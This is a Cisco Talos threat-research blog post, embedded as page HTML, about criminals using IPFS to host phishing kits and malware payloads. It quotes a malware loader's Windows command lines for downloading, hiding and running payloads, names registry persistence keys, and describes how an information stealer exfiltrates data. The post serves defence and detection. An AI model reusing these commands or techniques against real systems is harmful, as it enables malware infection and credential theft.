+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/podcasts">
+                                <h4>Podcasts</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="podcast-sub-trigger">BACK</label>
+                        </li>
+                        <li><a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos</a></li>
+                        <li><a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="podcast-icon-nav" x="0px" y="0px" viewBox="0 0 71.8 75" width="26px" height="20px" style="enable-background:new 0 0 71.8 75;" xml:space="preserve">
+                            <style type="text/css">
+                                .podcast-fill{fill:#fff;}
+                            </style>
+                            <path class="podcast-fill" d="M21.8,15.1c0-7.8,6.3-14.1,14.1-14.1c7.8,0,14.1,6.3,14.1,14.1v25.4c0,7.8-6.3,14.1-14.1,14.1  c-7.8,0-14.1-6.3-14.1-14.1V15.1z M59.9,40.1c0,12.4-9.4,22.6-21.5,23.9v3.6h12.8c1.4,0,2.6,1.2,2.6,2.6c0,1.4-1.2,2.6-2.6,2.6H20.4  c-1.4,0-2.6-1.2-2.6-2.6c0-1.4,1.2-2.6,2.6-2.6h12.8V64c-12-1.3-21.5-11.5-21.5-23.9v-6.8c0-1.4,1.2-2.6,2.6-2.6  c1.4,0,2.6,1.2,2.6,2.6v6.8c0,10.4,8.5,18.8,18.8,18.8c10.4,0,18.8-8.5,18.8-18.9v-6.8c0-1.4,1.2-2.6,2.6-2.6c1.4,0,2.6,1.2,2.6,2.6  V40.1z"></path>
+                        </svg>
+                    </div>
+                </li>
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/about">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="55px" height="55px" viewBox="0 0 55 55">
+                            <g>
+                                <g class="mobile-nav-home">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                                </g>
+                            </g>
+                        </svg>
+                        <span>About</span>
+                    </a>
+                </li>
+                <li class="nav-item desktop-hide">
+                    <button class="search-button" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg> <span>Search Blog</span></button>
+                </li>
+            </ul>
+        </div>
+        <div class="nav-search-wrapper">
+            <button class="search-button" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+        </div>
+    </div>
+</nav>
+    
+
+    <main id="site-main">
+
+            <div class="banner-content-wrapper">
+                <div class="container">
+                    <div class="row">
+                            <div class="col threat-spotlight-graphic banner-post-graphic">
+                            </div>
+                    </div>
+                </div>
+            </div>
+                <div class="container-fluid">
+                    <div class="row banner-bg-container banner-bg-2">
+                        <div class="col left-bg-2"></div>
+                        <div class="col right-bg-2"></div>
+                    </div>
+                </div>
+            
+        <div class="container-fluid">
+            <div class="row main-content-row">
+                <div class="col post-full-content">
+                    
+<article class="post tag-threat-spotlight tag-threats tag-securex-3  blog-series-article">
+
+    <h1 class="text-center">Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns</h1>
+
+    <div class="text-center m-1">
+        <div class="post-author">
+            <span>By </span>
+                <a href="https://blog.talosintelligence.com/author/edmund-brumaghin/">Edmund Brumaghin</a>
+        </div>
+
+        <br/>
+        <time class="post-datetime" datetime="November 9, 2022 08:00">
+            Wednesday, November 9, 2022 08:00
+        </time>
+
+        <div class="m-3">
+                        <a href="https://blog.talosintelligence.com/category/threat-spotlight/" class="category primary-category">
+                            Threat Spotlight
+                        </a>
+                                            <a href="https://blog.talosintelligence.com/category/threats/" class="category primary-category">
+                            Threats
+                        </a>
+                                            <a href="https://blog.talosintelligence.com/category/securex-3/" class="category primary-category">
+                            SecureX
+                        </a>
+                            </div>
+    </div>
+
+    <section class="post-content-wrapper mt-5">
+        <div class="post-content">
+            <ul><li>The InterPlanetary File System (IPFS) is an emerging Web3 technology that is currently seeing widespread abuse by threat actors.</li><li>Cisco Talos has observed multiple ongoing campaigns that leverage the IPFS network to host their malware payloads and phishing kit infrastructure while facilitating other attacks.</li><li>IPFS is often used for legitimate purposes, which makes it more difficult for security teams to differentiate between benign and malicious IPFS activity in their networks.</li><li>Multiple malware families are currently being hosted within IPFS and retrieved during the initial stages of malware attacks.</li><li>Organizations should become familiar with these new technologies and how they are being leveraged by threat actors to defend against new techniques that use them.</li></ul><p>The emergence of <a href="https://blog.talosintelligence.com/securing-web-3-0-metaverse-and-beyond/">new Web3 technologies</a> in recent years has resulted in drastic changes to the way content is hosted and accessed on the internet. Many of these technologies are focused on circumventing censorship and decentralizing control of large portions of the content and infrastructure people use and access on a regular basis. While these technologies have legitimate uses in a variety of practical applications, they also create opportunities for adversaries to take advantage of them within their phishing and malware distribution campaigns. Over the past few years, Talos has observed an increase in the number of cybercriminals <a href="https://blog.talosintelligence.com/2022/08/dark-utilities.html">taking advantage</a> of technologies like the <a href="https://docs.ipfs.tech/concepts/what-is-ipfs/">InterPlanetary File System (IPFS)</a> to facilitate the hosting of malicious content as they provide the equivalent of “bulletproof hosting” and are extremely resilient to attempts to moderate the content stored there.</p><h2 id="what-is-the-interplanetary-file-system-ipfs">What is the InterPlanetary File System (IPFS)?</h2><p>The InterPlanetary File System (IPFS) is a Web3 technology designed to enable decentralized storage of resources on the internet. When content is stored on the IPFS network, it is mirrored across many systems that participate in the network, so that when one of these systems is unavailable, other systems can service requests for this content. </p><p>IPFS stores different types of data, such as the images associated with NFTs, resources used to render web pages, or files that can be accessed by internet users. IPFS was designed to be resilient against content censorship, meaning that it is not possible to effectively remove content from within the IPFS network once it’s stored there.</p><h3 id="ipfs-gateways">IPFS gateways</h3><p>Users that wish to access content stored within IPFS can do so either using an IPFS client, such as the one provided <a href="https://docs.ipfs.io/install/ipfs-desktop/">here</a>, or they can make use of “IPFS Gateways” which effectively sit between the internet and the IPFS network to allow clients to access content hosted on the network. This functionality is similar to what Tor2web gateways provide to access contents within the Tor network without requiring a client installation. </p><p>Anyone can set up an IPFS gateway using <a href="https://ipfs.github.io/public-gateway-checker/">a range of publicly available</a> tools. This screenshot shows several of the public IPFS gateways accessible across the internet.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image4-1.png" class="kg-image" alt loading="lazy" width="1081" height="771" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image4-1.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image4-1.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image4-1.png 1081w" sizes="(min-width: 720px) 720px"></figure><p>It is simple to store new content within IPFS and once there, the content is resilient against takedowns, making it increasingly attractive to a variety of attackers for hosting phishing pages, malware payloads and other malicious content. </p><p>When systems use IPFS gateways to access contents stored on the IPFS network, they typically rely on the same HTTP/HTTPS-based communications used to access other websites on the internet. IPFS gateways can be configured to handle incoming requests in a few different ways. In some implementations, the subdomain specified in the HTTP request is often used to locate the requested resource on the IPFS network as shown in the following example, which is a mirrored copy of <a href="https://www.wikipedia.org/">Wikipedia</a> hosted on the IPFS network. The IPFS identifier, or CID, for the resource is highlighted below.</p><p>hxxps[:]//<strong>bafybeiaysi4s6lnjev27ln5icwm6tueaw2vdykrtjkwiphwekaywqhcjze[</strong>.]ipfs[.]infura-ipfs[.]io</p><p>In other implementations, the IPFS resource location is appended to the end of the URL being requested, as shown in the following example:</p><p>hxxps[:]//ipfs[.]io/ipfs/<strong>bafybeiaysi4s6lnjev27ln5icwm6tueaw2vdykrtjkwiphwekaywqhcjze</strong></p><p>There are other methods for handling requests using DNS entries, as well. The specific implementation varies across IPFS gateways. Browsers have even begun <a href="https://www.zdnet.com/article/brave-becomes-first-browser-to-add-native-support-for-the-ipfs-protocol/">implementing</a> native support for the IPFS network, removing the need to use IPFS gateways in some cases.</p><h3 id="ipfs-use-in-phishing-campaigns">IPFS use in phishing campaigns</h3><p>IPFS is currently being leveraged to host phishing kits, which are the websites that phishing campaigns typically use to collect and harvest credentials from unsuspecting victims. In one example, the victim received a PDF that purports to be associated with the DocuSign document-signing service. A screenshot of one such PDF is shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image11.png" class="kg-image" alt loading="lazy" width="1235" height="872" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image11.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image11.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image11.png 1235w" sizes="(min-width: 720px) 720px"></figure><p>When the victim clicks on the “Review Document” link, they are redirected to a page made to appear as if it is a Microsoft authentication page. However, the page is actually being hosted on the IPFS network.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image8.png" class="kg-image" alt loading="lazy" width="962" height="751" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image8.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image8.png 962w" sizes="(min-width: 720px) 720px"></figure><p>The user is prompted to enter an email address and password. This information is then transmitted to the attacker via an HTTP POST request to an attacker-controlled web server where it can be collected and processed for use in further attacks.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image9.png" class="kg-image" alt loading="lazy" width="748" height="356" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image9.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image9.png 748w" sizes="(min-width: 720px) 720px"></figure><p>We’ve observed several similar examples in phishing campaigns over the past year, as adversaries recognize the content moderation challenges associated with hosting their phishing kits on the IPFS network. In this case, the PDF hyperlink was pointing to an IPFS gateway that moderated the content to protect potential victims and displayed the following message to victims attempting to navigate to it. </p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image13.png" class="kg-image" alt loading="lazy" width="838" height="144" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image13.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image13.png 838w" sizes="(min-width: 720px) 720px"></figure><p>However, the content is still present within the IPFS network and simply changing the IPFS gateway being used to retrieve the content confirms this is the case.</p><h2 id="ipfs-use-in-malware-campaigns">IPFS use in malware campaigns</h2><p>There are a variety of threat actors currently leveraging technologies like IPFS in their malware distribution campaigns. It provides low-cost storage for malicious payloads while offering resilience against content moderation, effectively acting as “bulletproof hosting” for adversaries. Likewise, the use of common IPFS gateways for accessing the malicious contents hosted within the IPFS network makes it more difficult for organizations to block access when compared to the use of malicious domains for content retrieval. We have observed various samples in the wild that are currently leveraging IPFS.</p><p>Throughout 2022, we’ve observed the volume of samples in the wild continuing to increase as this becomes a more popular hosting method for adversaries. Below is a graphic showing the increase in the number of unique samples relying on IPFS that have been uploaded to public sample repositories.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image16.png" class="kg-image" alt loading="lazy" width="1800" height="1022" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image16.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image16.png 1000w, https://blog.talosintelligence.com/content/images/size/w1600/2022/11/image16.png 1600w, https://blog.talosintelligence.com/content/images/2022/11/image16.png 1800w" sizes="(min-width: 720px) 720px"></figure><h3 id="agent-tesla-malspam-campaign">Agent Tesla malspam campaign</h3><p>We’ve observed ongoing malspam campaigns leveraging IPFS throughout the infection process to eventually retrieve a malware payload. In one example, the email sent to victims purports to be from a Turkish financial institution and claims to be associated with SWIFT payments, a commonly used system for international monetary transactions.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image7.png" class="kg-image" alt loading="lazy" width="849" height="950" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image7.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image7.png 849w" sizes="(min-width: 720px) 720px"></figure><p>The email contains a ZIP attachment that holds a PE32 executable. The executable, written in .NET, functions as a downloader for the next stage of the infection chain. When executed, the downloader reaches out to an IPFS gateway to retrieve a blob of data that has been hosted within the IPFS network as shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image12.png" class="kg-image" alt loading="lazy" width="1628" height="510" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image12.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image12.png 1000w, https://blog.talosintelligence.com/content/images/size/w1600/2022/11/image12.png 1600w, https://blog.talosintelligence.com/content/images/2022/11/image12.png 1628w" sizes="(min-width: 720px) 720px"></figure><p>This data contains an obfuscated PE32 executable that functions as the next-stage malware payload. The downloader takes the data from the IPFS gateway and stores each byte in an array. It then uses a key value stored in the executable to convert the byte array into the next-stage PE32.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image6.png" class="kg-image" alt loading="lazy" width="1247" height="331" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image6.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image6.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image6.png 1247w" sizes="(min-width: 720px) 720px"></figure><p>This is then reflectively loaded and executed, launching the next stage of the infection process, which in this case is a remote access trojan (RAT) called <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.agent_tesla">Agent Tesla</a>.</p><p>In another example, we observed a variety of malware payloads being uploaded to public sample repositories over a period of several months. We identified three distinct clusters of malware that were likely being created by the same threat actor. Code-level issues suggest that many of the samples were currently undergoing active development while being uploaded, possibly to test detection capabilities.</p><p>In all three clusters, the initial payload functioned as a loader and operated similarly, however, the final payload hosted on the IPFS network was different in each cluster. The final payloads we observed included a Python-based information stealer, reverse shell payloads that were likely generated using <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>, and a batch file designed to destroy victim systems.</p><h3 id="initial-loader">Initial loader</h3><p>The loader used in all of these cases functioned similarly, sometimes hosted on the Discord content delivery network (CDN), a practice that has become increasingly common with malware distributors as previously described <a href="https://blog.talosintelligence.com/2021/04/collab-app-abuse.html">here</a>. The file names used indicate that they may have been spread under the guise of cheats and cracks for video games such as “Minecraft.” In most cases, the loader was not packed, but we did observe samples packed using <a href="https://upx.github.io/">UPX</a>. </p><p>When executed, the loader first creates a directory structure within %APPDATA% using the following command:</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft &amp;&amp; mkdir Network</code></p>
+<!--kg-card-end: markdown--><p>The malware then attempts to retrieve Python 3.10 from the legitimate software provider using the cURL command.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image1.png" class="kg-image" alt loading="lazy" width="1352" height="378" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image1.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image1.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image1.png 1352w" sizes="(min-width: 720px) 720px"></figure><p>This is notable, as the choice to directly leverage cURL may significantly reduce the number of potential victims, as it was not added to Windows as a native command line utility until Windows 11. The command line syntax used to initiate the download is shown below.</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c curl https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -o %appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip</code></p>
+<!--kg-card-end: markdown--><p>Once the ZIP archive has been retrieved, it is then unzipped into the directory that was previously created using the PowerShell “Expand-Archive” cmdlet.</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network &amp;&amp; powershell Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath %appdata%\Microsoft\Network</code></p>
+<!--kg-card-end: markdown--><p>The malware then attempts to retrieve the final payload in the infection chain, storing it within the Network directory using the filename “Packages.txt.” An example of the loader retrieving Hannabi Grabber, an information stealer written in Python is shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image2.png" class="kg-image" alt loading="lazy" width="1439" height="552" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image2.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image2.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image2.png 1439w" sizes="(min-width: 720px) 720px"></figure><p>The loader then uses the attrib.exe utility to set the System and Hidden flags on the previously created directory as well as the Python ZIP archive and final payload that was retrieved.</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network</code></p>
+<p><code>C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip</code></p>
+<p><code>C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network\Packages.txt</code></p>
+<!--kg-card-end: markdown--><p>Finally, the loader invokes the newly downloaded Python executable and passes the final payload as a command line argument, executing the next stage of the infection process.</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network &amp;&amp; python.exe Packages.txt</code></p>
+<!--kg-card-end: markdown--><p>In some cases, the malware was also observed achieving persistence via adding entries into the Windows registry at the following locations:</p><!--kg-card-begin: markdown--><p><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code><br>
+<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<!--kg-card-end: markdown--><p>During our analysis of samples associated with this loader, we observed that the IPFS gateway that was being used was no longer servicing requests, however, Talos obtained the next-stage payloads manually via another IPFS gateways for analysis.</p><h3 id="reverse-shell">Reverse shell</h3><p>In one of the clusters leveraging this loader, we observed that the payload being hosted within the IPFS network was a Python script containing a large base64 encoded blob along with the Python code responsible for decoding the base64. Note that the following screenshot was redacted for space, as the base64-encoded blob was rather large. </p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image3.png" class="kg-image" alt loading="lazy" width="683" height="198" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image3.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image3.png 683w"></figure><p>The base64 contained several layers of base64 encoded blobs, each wrapped in Python code responsible for decoding them. After decoding all of the layers, the following is the deobfuscated reverse shell payload.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image5.png" class="kg-image" alt loading="lazy" width="421" height="241"></figure><p>At the time of analysis, the C2 server was no longer servicing requests on TCP/4444.</p><h3 id="destructive-malware">Destructive Malware</h3><p>In another cluster we analyzed, we observed that the final payload hosted within IPFS was a Windows batch file, as shown below:</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image20.png" class="kg-image" alt loading="lazy" width="567" height="149"></figure><p>When the batch file is retrieved, it is stored within the Network directory using the filename “Script.bat.”</p><p>This batch file is responsible for the following destructive behavior:</p><ul><li>Deleting volume shadow copies on the system.</li><li>Deleting directory contents stored within C:\Users (typically associated with user profiles).</li><li>Iterating through all mounted filesystems present on the system and deleting contents stored on them.</li></ul><p>Fortunately for victims, in the samples analyzed the loader incorrectly attempts to invoke the batch file as shown below.</p><!--kg-card-begin: markdown--><p><code>C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network &amp;&amp; powershell -Command start script.bat -Verb RunAs</code></p>
+<!--kg-card-end: markdown--><h3 id="hannabi-grabber">Hannabi Grabber</h3><p>The final cluster of malware associated with this loader is responsible for retrieving and executing a Python-based information stealer called Hannabi Grabber. In the samples we analyzed, the Python version retrieved does not natively contain the modules required for the script to successfully execute causing the infection process to fail, however, given the volume of features present in the stealer, we analyzed it to confirm detection capabilities in the case that it is distributed via different mechanisms.</p><p>Hannabi Grabber is a full-featured information stealer written in Python. It leverages Discord Webhooks for C2 and data exfiltration. It currently features support for stealing information from a variety of applications that may be present on victim systems. It collects survey information from the infected machine, obtains the geographic location of the system via the IPInfo service, takes screenshots and eventually transmits that data to an attacker-controlled Discord server in JSON format.</p><p>Below is a listing of many of the various applications the stealer supports.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image18.png" class="kg-image" alt loading="lazy" width="852" height="477" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image18.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image18.png 852w" sizes="(min-width: 720px) 720px"></figure><p>In addition to the previously listed applications, the malware also supports retrieving password and cookie data from Chrome, as shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image21.png" class="kg-image" alt loading="lazy" width="795" height="455" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image21.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image21.png 795w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image17.png" class="kg-image" alt loading="lazy" width="1286" height="442" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image17.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image17.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image17.png 1286w" sizes="(min-width: 720px) 720px"></figure><p>Similar functionality also exists to target Mozilla Firefox browser data that may be present on the system.</p><p>The information stealer is particularly interested in Discord and Roblox data. It features several mechanisms that check for the existence of Discord Token Protectors such as DiscordTokenProtector, BetterDiscord and more. If discovered, the malware will attempt to bypass them to obtain Discord tokens from the victim. An example of one of these checks is shown below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image10.png" class="kg-image" alt loading="lazy" width="825" height="649" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image10.png 600w, https://blog.talosintelligence.com/content/images/2022/11/image10.png 825w" sizes="(min-width: 720px) 720px"></figure><p>Application data that is collected is stored within a directory structure inside of the %TEMP% directory, in a folder called “RedDiscord” that is created by the malware. Before exfiltrating the data, the malware creates a ZIP archive within the RedDiscord directory called “Hannabi-&lt;USERNAME&gt;.zip.” The malware first transmits beacon information and will then attempt to exfiltrate the newly created ZIP archive.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/image15.png" class="kg-image" alt loading="lazy" width="1029" height="932" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/image15.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/image15.png 1000w, https://blog.talosintelligence.com/content/images/2022/11/image15.png 1029w" sizes="(min-width: 720px) 720px"></figure><p>Hannabi Grabber has a significant amount of functionality that is common to information-stealing malware. Typically, attackers will attempt to leverage PyInstaller or Py2EXE to compile their Python into a PE32 file format prior to distributing it to victims. This is a case where instead, the attacker chose to include a Python installation process during the infection and is leveraging Python directly to steal sensitive information from victims.</p><h2 id="conclusion">Conclusion</h2><p>Many new Web3 technologies have emerged recently, attempting to provide valuable functionality to users. As these technologies have continued to see increased adoption for legitimate purposes, they have begun to be leveraged by adversaries as well. We have continued to observe an increase in the volume of malware and phishing campaigns that are taking advantage of technologies like IPFS for the purposes of hosting malicious components used in malware infections, phishing kits used to collect sensitive authentication data and more. </p><p>We expect this activity to continue to increase as more threat actors recognize that IPFS can be used to facilitate bulletproof hosting, is resilient against content moderation and law enforcement activities, and introduces problems for organizations attempting to detect and defend against attacks that may leverage the IPFS network. Organizations should be aware of how these newly emerging technologies are being actively used across the threat landscape and evaluate how to best implement security controls to prevent or detect successful attacks in their environments.</p><h2 id="coverage">Coverage</h2><p>Ways our customers can detect and block this threat are listed below.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2022/11/endpoint-email-firewall-analytics-DNS-SIG-web.jpg" class="kg-image" alt loading="lazy" width="2000" height="404" srcset="https://blog.talosintelligence.com/content/images/size/w600/2022/11/endpoint-email-firewall-analytics-DNS-SIG-web.jpg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2022/11/endpoint-email-firewall-analytics-DNS-SIG-web.jpg 1000w, https://blog.talosintelligence.com/content/images/size/w1600/2022/11/endpoint-email-firewall-analytics-DNS-SIG-web.jpg 1600w, https://blog.talosintelligence.com/content/images/size/w2400/2022/11/endpoint-email-firewall-analytics-DNS-SIG-web.jpg 2400w" sizes="(min-width: 720px) 720px"></figure><p><a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html">Cisco Secure Endpoint</a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free <a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium=web-referral?utm_source=cisco&amp;utm_campaign=amp-free-trial&amp;utm_term=pgm-talos-trial&amp;utm_content=amp-free-trial">here.</a></p><p><a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> web scanning prevents access to malicious websites and detects malware used in these attacks.</p><p><a href="https://www.cisco.com/c/en/us/products/security/email-security/index.html">Cisco Secure Email</a> (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free <a href="https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium=web-referral&amp;utm_source=cisco&amp;utm_campaign=cmd-free-trial-request&amp;utm_term=pgm-talos-trial">here</a>.</p><p><a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html">Cisco Secure Firewall</a> (formerly Next-Generation Firewall and Firepower NGFW) appliances such as <a href="https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html">Threat Defense Virtual</a>, <a href="https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html">Adaptive Security Appliance</a> and <a href="https://meraki.cisco.com/products/appliances">Meraki MX</a> can detect malicious activity associated with this threat.</p><p><a href="https://www.cisco.com/c/en/us/products/security/threat-grid/index.html">Cisco Secure Malware Analytics</a> (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.</p><p><a href="https://umbrella.cisco.com/">Umbrella</a>, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella <a 